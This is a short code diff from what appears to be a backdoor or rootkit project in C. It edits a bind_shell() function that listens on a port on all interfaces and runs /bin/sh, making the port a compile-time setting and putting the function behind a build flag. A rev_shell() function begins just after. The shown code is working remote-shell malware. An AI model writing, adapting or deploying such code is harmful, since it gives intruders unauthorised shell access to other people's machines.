@@ -139,9 +139,10 @@ static int execute(char *file_path) {
 }
 
 void bind_shell(void) {
+#if defined(BIND_SHELL) && defined(BIND_PORT)
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
-    addr.sin_port = htons(44444);
+    addr.sin_port = htons(BIND_PORT);
     addr.sin_addr.s_addr = INADDR_ANY;
 
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -156,6 +157,7 @@ void bind_shell(void) {
     }
 
     execve("/bin/sh", NULL, NULL);
+#endif
 }
 
 void rev_shell(void) {
